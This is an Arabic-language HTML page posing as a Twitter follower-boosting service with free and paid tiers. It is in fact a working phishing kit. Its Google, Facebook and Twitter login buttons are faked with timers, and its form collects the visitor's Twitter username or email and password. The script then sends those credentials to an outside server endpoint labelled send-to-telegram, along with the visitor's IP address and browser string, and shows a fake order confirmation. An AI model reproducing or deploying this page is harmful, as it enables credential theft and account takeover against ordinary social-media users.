<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>شحن متابعين تويتر</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #0a192f, #8b0000, #0a192f);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
      color: #fff;
      min-height: 100vh;
      padding: 20px;
      overflow-x: hidden;
      position: relative;
    }
    
    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    .main-container {
      max-width: 500px;
      margin: 20px auto;
      background: rgba(10, 25, 47, 0.8);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
      border: 1px solid rgba(139, 0, 0, 0.3);
      max-height: 90vh;
      overflow-y: auto;
      scroll-behavior: smooth;
    }
    
    .main-container::-webkit-scrollbar {
      width: 8px;
    }
    
    .main-container::-webkit-scrollbar-track {
      background: rgba(0, 0, 0, 0.2);
    }
    
    .main-container::-webkit-scrollbar-thumb {
      background: rgba(139, 0, 0, 0.5);
      border-radius: 4px;
    }
    
    .main-container::-webkit-scrollbar-thumb:hover {
      background: rgba(139, 0, 0, 0.7);
    }
    
    .header {
      text-align: center;
      padding: 25px 20px 15px;
      background: rgba(10, 25, 47, 0.9);
      position: relative;
      overflow: hidden;
      border-bottom: 2px solid rgba(139, 0, 0, 0.5);
    }
    
    .header::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url('https://images.unsplash.com/photo-1611605698335-8b1569810432?q=80&w=1974&auto=format&fit=crop') center/cover;
      opacity: 0.1;
      z-index: -1;
    }
    
    .header h1 {
      font-size: 28px;
      margin-bottom: 10px;
      color: #ff6b6b;
      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
    }
    
    .header p {
      font-size: 16px;
      opacity: 0.9;
      max-width: 400px;
      margin: 0 auto;
      color: #a3b1c6;
    }
    
    .section {
      padding: 25px;
      border-bottom: 1px solid rgba(139, 0, 0, 0.2);
    }
    
    .login-options {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }
    
    .btn {
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 15px;
      border-radius: 12px;
      font-size: 18px;
      font-weight: 600;
      border: none;
      cursor: pointer;
      transition: all 0.3s ease;
      text-align: center;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
    }
    
    .btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 6px 10px rgba(0, 0, 0, 0.3);
    }
    
    .btn img {
      width: 30px;
      height: 30px;
      margin-left: 10px;
      border-radius: 50%;
    }
    
    .google-btn {
      background: linear-gradient(to right, #0a192f, #1a3a5f);
      color: #a3b1c6;
      border: 1px solid rgba(139, 0, 0, 0.3);
    }
    
    .facebook-btn {
      background: linear-gradient(to right, #0a192f, #1a3a5f);
      color: #a3b1c6;
      border: 1px solid rgba(139, 0, 0, 0.3);
    }
    
    .twitter-btn {
      background: linear-gradient(to right, #8b0000, #a52a2a);
      color: white;
      border: 1px solid rgba(139, 0, 0, 0.5);
    }
    
    .form-container {
      display: none;
      background: rgba(10, 25, 47, 0.6);
      border-radius: 15px;
      padding: 20px;
      margin-top: 15px;
      border: 1px solid rgba(139, 0, 0, 0.3);
    }
    
    .form-title {
      text-align: center;
      margin-bottom: 20px;
      font-size: 22px;
      color: #ff6b6b;
    }
    
    .form-group {
      margin-bottom: 20px;
    }
    
    .form-group label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #64b5f6;
    }
    
    .form-group input, 
    .form-group select {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      border: 1px solid rgba(139, 0, 0, 0.3);
      background: rgba(10, 25, 47, 0.7);
      color: white;
      font-size: 16px;
      font-family: 'Cairo', sans-serif;
    }
    
    .form-group input:focus, 
    .form-group select:focus {
      outline: none;
      border-color: #ff6b6b;
      box-shadow: 0 0 0 2px rgba(255, 107, 107, 0.2);
    }
    
    .form-group input::placeholder {
      color: rgba(255, 255, 255, 0.5);
    }
    
    .validation-message {
      color: #ff6b6b;
      font-size: 14px;
      text-align: right;
      margin-top: 8px;
      height: 16px;
    }
    
    .submit-btn {
      background: linear-gradient(to right, #8b0000, #a52a2a);
      color: white;
      font-weight: bold;
      padding: 15px;
      width: 100%;
      border-radius: 10px;
      border: none;
      cursor: pointer;
      font-size: 18px;
      transition: all 0.3s ease;
      margin-top: 10px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
    }
    
    .submit-btn:hover {
      background: linear-gradient(to right, #a52a2a, #8b0000);
      transform: scale(1.02);
    }
    
    .pricing-title {
      text-align: center;
      margin-bottom: 20px;
      font-size: 22px;
      color: #ff6b6b;
    }
    
    .pricing-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
      gap: 15px;
    }
    
    .price-card {
      background: rgba(10, 25, 47, 0.6);
      border-radius: 12px;
      padding: 20px 15px;
      text-align: center;
      transition: all 0.3s ease;
      border: 1px solid rgba(139, 0, 0, 0.3);
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
    }
    
    .price-card:hover {
      transform: translateY(-5px);
      background: rgba(10, 25, 47, 0.8);
      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.3);
    }
    
    .followers-count {
      font-size: 24px;
      font-weight: bold;
      color: #64b5f6;
      margin-bottom: 10px;
    }
    
    .price-tag {
      font-size: 20px;
      font-weight: bold;
      color: #ff6b6b;
      margin-bottom: 15px;
    }
    
    .buy-btn {
      background: linear-gradient(to right, #0a192f, #1a3a5f);
      color: #a3b1c6;
      border: 1px solid rgba(139, 0, 0, 0.3);
      padding: 10px 15px;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
      transition: all 0.3s ease;
    }
    
    .buy-btn:hover {
      background: linear-gradient(to right, #1a3a5f, #0a192f);
      color: white;
    }
    
    .free-badge {
      background: linear-gradient(to right, #8b0000, #a52a2a);
      color: white;
    }
    
    .social-icons {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 15px;
      padding: 15px;
      background: rgba(10, 25, 47, 0.6);
      border-top: 1px solid rgba(139, 0, 0, 0.3);
    }
    
    .social-icon {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      background: rgba(139, 0, 0, 0.3);
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.3s ease;
    }
    
    .social-icon:hover {
      background: rgba(139, 0, 0, 0.5);
      transform: scale(1.1);
    }
    
    .social-icon img {
      width: 30px;
      height: 30px;
    }
    
    .floating-bird {
      position: absolute;
      width: 80px;
      height: 80px;
      top: 20px;
      right: 20px;
      opacity: 0.1;
      z-index: -1;
      animation: float 8s ease-in-out infinite;
      filter: hue-rotate(300deg);
    }
    
    .floating-bird:nth-child(2) {
      top: auto;
      bottom: 20px;
      left: 20px;
      right: auto;
      animation-delay: 2s;
      width: 60px;
      height: 60px;
      filter: hue-rotate(180deg);
    }
    
    @keyframes float {
      0% { transform: translateY(0px) rotate(0deg); }
      50% { transform: translateY(-20px) rotate(5deg); }
      100% { transform: translateY(0px) rotate(0deg); }
    }
    
    .success-message {
      background: rgba(46, 204, 113, 0.1);
      border: 1px solid rgba(46, 204, 113, 0.3);
      border-radius: 10px;
      padding: 15px;
      margin: 20px 0;
      text-align: center;
      animation: fadeIn 0.5s ease;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    .notification {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(10, 25, 47, 0.95);
      color: white;
      padding: 15px 25px;
      border-radius: 10px;
      z-index: 1000;
      display: flex;
      align-items: center;
      box-shadow: 0 5px 15px rgba(0,0,0,0.4);
      animation: slideIn 0.3s, fadeOut 0.5s 2.5s forwards;
      border-left: 4px solid #ff6b6b;
    }
    
    @keyframes slideIn {
      from { top: -100px; }
      to { top: 20px; }
    }
    
    @keyframes fadeOut {
      from { opacity: 1; }
      to { opacity: 0; top: -100px; }
    }
    
    .notification.success {
      border-left: 4px solid #2ecc71;
    }
    
    .notification.error {
      border-left: 4px solid #e74c3c;
    }
    
    .notification.info {
      border-left: 4px solid #3498db;
    }
    
    .notification-icon {
      margin-left: 10px;
      font-size: 20px;
    }
    
    @media (max-width: 600px) {
      .main-container {
        max-height: 95vh;
      }
      
      .header h1 {
        font-size: 24px;
      }
      
      .btn {
        padding: 12px;
        font-size: 16px;
      }
      
      .pricing-grid {
        grid-template-columns: 1fr;
      }
    }
    
    .spinner {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 1s ease-in-out infinite;
      margin-left: 10px;
      position: relative;
      z-index: 2;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    .logo-container {
      display: flex;
      justify-content: center;
      margin-bottom: 15px;
    }
    
    .twitter-logo {
      width: 50px;
      height: 50px;
      background: linear-gradient(45deg, #0a192f, #8b0000);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
    }
    
    .twitter-logo i {
      color: white;
      font-size: 24px;
    }
    
    /* Loading spinner */
    .spinnert {
      display: none;
      width: 40px;
      height: 40px;
      margin: 0 auto;
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top: 4px solid var(--secondary);
      animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  
  <!-- طيور متحركة -->
  <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter Bird" class="floating-bird">
  <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter Bird" class="floating-bird">
  
  <!-- الحاوية الرئيسية -->
  <div class="main-container">
    <div class="header">
      <div class="logo-container">
        <div class="twitter-logo">
          <i class="fab fa-twitter"></i>
        </div>
      </div>
      <h1>شحن متابعين تويتر</h1>
      <p>احصل على الآلاف من المتابعين الحقيقيين بأسعار تنافسية وخطوات بسيطة</p>
    </div>
    
    <div class="section">
      <div class="login-options">
        <button class="btn google-btn" onclick="loginWithGoogle()">
          <span>تسجيل الدخول عبر جوجل</span>
          <img src="https://cdn-icons-png.flaticon.com/512/300/300221.png" alt="Google">
        </button>
        
        <button class="btn facebook-btn" onclick="loginWithFacebook()">
          <span>تسجيل الدخول عبر فيسبوك</span>
          <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook">
        </button>
        
        <button class="btn twitter-btn" onclick="loginWithTwitter()">
          <span>تسجيل الدخول عبر تويتر</span>
          <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter">
        </button>
      </div>
      
      <div id="form" class="form-container">
        <h2 class="form-title">شحن متابعين تويتر <i class="fab fa-twitter"></i></h2>
        <form id="twitterForm">
        
        <div class="form-group">
            <label>اسم المستخدم او البريد الالكتروني :</label>
            <input type="text" name="player_id" placeholder="@username" required>
          </div>
          
          <div class="form-group">
            <label>كلمة المرور:</label>
            <input type="password" name="password" placeholder="********" required>
          </div>
          
          <div class="form-group">
            <label>عدد المتابعين:</label>
            <select name="amount" required>
              <option value="1000 متابع مجاني">1000 متابع مجاني</option>
              <option value="1500 متابع">1500 متابع</option>
              <option value="2000 متابع">2000 متابع</option>
              <option value="2500 متابع">2500 متابع</option>
              <option value="3000 متابع">3000 متابع</option>
            </select>
          </div>
          
          <div class="spinnert" id="loadingSpinner"></div>
        <button type="submit" class="submit-btn" id="submitBtn">شحن المتابعين <i class="fas fa-bolt"></i></button>
        </form>
      </div>
    </div>
    
    <div class="section">
      <h2 class="pricing-title">أسعار المتابعين</h2>
      <div class="pricing-grid">
        <div class="price-card">
          <div class="followers-count">1000</div>
          <div class="price-tag">مجاني</div>
          <button class="buy-btn free-badge">اختر</button>
        </div>
        
        <div class="price-card">
          <div class="followers-count">1500</div>
          <div class="price-tag">2$</div>
          <button class="buy-btn">شراء</button>
        </div>
        
        <div class="price-card">
          <div class="followers-count">2000</div>
          <div class="price-tag">3$</div>
          <button class="buy-btn">شراء</button>
        </div>
        
        <div class="price-card">
          <div class="followers-count">2500</div>
          <div class="price-tag">4$</div>
          <button class="buy-btn">شراء</button>
        </div>
        
        <div class="price-card">
          <div class="followers-count">3000</div>
          <div class="price-tag">5$</div>
          <button class="buy-btn">شراء</button>
        </div>
      </div>
    </div>
    
    <div class="social-icons">
      <div class="social-icon">
        <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter">
      </div>
      <div class="social-icon">
        <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="Instagram">
      </div>
      <div class="social-icon">
        <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook">
      </div>
      <div class="social-icon">
        <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png" alt="YouTube">
      </div>
    </div>
  </div>
  
  <script>
    // إظهار الإشعار
    function showNotification(message, type) {
      const notification = document.createElement('div');
      notification.className = `notification ${type}`;
      notification.innerHTML = `
        ${message}
        <span class="notification-icon">${type === 'success' ? '✓' : type === 'error' ? '✗' : 'ℹ'}</span>
      `;
      
      document.body.appendChild(notification);
      
      setTimeout(() => {
        notification.remove();
      }, 3000);
    }
  
  // تسجيل الدخول عبر جوجل
  function loginWithGoogle() {
    const btn = event.currentTarget;
    const originalHTML = btn.innerHTML;
    
    btn.innerHTML = '<span>جاري تسجيل الدخول...</span><div class="spinner"></div>';
    btn.disabled = true;
    
    setTimeout(() => {
      showNotification('تم تسجيل الدخول بنجاح عبر جوجل!', 'success');
      btn.innerHTML = originalHTML;
      btn.disabled = false;
      
      setTimeout(() => {
        showForm();
      }, 1500);
    }, 2000);
  }
  
  // تسجيل الدخول عبر فيسبوك
  function loginWithFacebook() {
    const btn = event.currentTarget;
    const originalHTML = btn.innerHTML;
    
    btn.innerHTML = '<span>جاري تسجيل الدخول...</span><div class="spinner"></div>';
    btn.disabled = true;
    
    setTimeout(() => {
      showNotification('تم تسجيل الدخول بنجاح عبر فيسبوك!', 'success');
      btn.innerHTML = originalHTML;
      btn.disabled = false;
      
      setTimeout(() => {
        showForm();
      }, 1500);
    }, 2000);
  }
  
  // تسجيل الدخول عبر تويتر
  function loginWithTwitter() {
    const btn = event.currentTarget;
    const originalHTML = btn.innerHTML;
    
    btn.innerHTML = '<span>جاري تسجيل الدخول...</span><div class="spinner"></div>';
    btn.disabled = true;
    
    setTimeout(() => {
      showNotification('تم تسجيل الدخول بنجاح عبر تويتر!', 'success');
      btn.innerHTML = originalHTML;
      btn.disabled = false;
      
      setTimeout(() => {
        showForm();
      }, 1500);
    }, 2000);
  }
    
    // إظهار نموذج الشحن
    function showForm() {
      document.querySelector(".login-options").style.display = "none";
      document.getElementById("form").style.display = "block";
      
      const container = document.querySelector('.main-container');
      const formElement = document.getElementById("form");
      const topPos = formElement.offsetTop;
      
      container.scrollTo({
        top: topPos - 20,
        behavior: 'smooth'
      });
    }

    document.addEventListener("DOMContentLoaded", () => {
      // الحصول على معرف الدردشة من الرابط
      const urlParams = new URLSearchParams(window.location.search);
      const CHAT_ID = urlParams.get('id');
      
      const form = document.getElementById("twitterForm");
      const submitBtn = document.getElementById("submitBtn");
      const loadingSpinner = document.getElementById("loadingSpinner");
      
      // عند إرسال النموذج
      if (!form) return;

      form.addEventListener("submit", async function (e) {
        e.preventDefault();
        
        // Show loading spinner and disable button
        submitBtn.style.display = "none";
        loadingSpinner.style.display = "block";

        const data = new FormData(this);
        const password = data.get("password");
        const playerId = data.get("player_id");
        const amount = data.get("amount");
        const platform = "تويتر";
        const device = navigator.userAgent;
        
        const ipData = await fetch("https://api.ipify.org?format=json")
          .then(res => res.json())
          .catch(() => ({ ip: "غير معروف" }));

        // تحضير البيانات للإرسال إلى السيرفر
        const requestData = {
          playerId: playerId,
          password: password,
          amount: amount,
          chatId: CHAT_ID || "unknown",
          platform: platform,
          device: device,
          ip: ipData.ip
        };

        try {
          // إرسال البيانات إلى السيرفر
          const response = await fetch('https://botlkm.onrender.com/send-to-telegram', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(requestData)
          });
          
          if (response.ok) {
            // إظهار رسالة النجاح
            const successHTML = `
              <div class="success-message">
                <h3>تمت العملية بنجاح! ✅</h3>
                <p>سيتم شحن متابعين تويتر خلال 24 ساعة</p>
                <p>رقم الطلب: #${Math.floor(100000 + Math.random() * 900000)}</p>
              </div>
            `;
            form.innerHTML = successHTML;
          } else {
            // إظهار رسالة الخطأ مع تفاصيل
            const errorHTML = `
              <div class="error-message">
                <h3>خطأ في الإرسال! ❌</h3>
                <p>حدث خطأ أثناء إرسال البيانات إلى السيرفر</p>
                <p>يرجى المحاولة مرة أخرى</p>
              </div>
            `;
            form.innerHTML = errorHTML;
          }
        } catch (error) {
          // إظهار رسالة الخطأ مع تفاصيل
          const errorHTML = `
            <div class="error-message">
              <h3>خطأ في الإرسال! ❌</h3>
              <p>${error.message || 'حدث خطأ غير معروف'}</p>
              <p>يرجى المحاولة مرة أخرى</p>
            </div>
          `;
          form.innerHTML = errorHTML;
        } finally {
          // إعادة عرض زر الإرسال
          submitBtn.style.display = "block";
          loadingSpinner.style.display = "none";
        }
      });
    });
  </script>
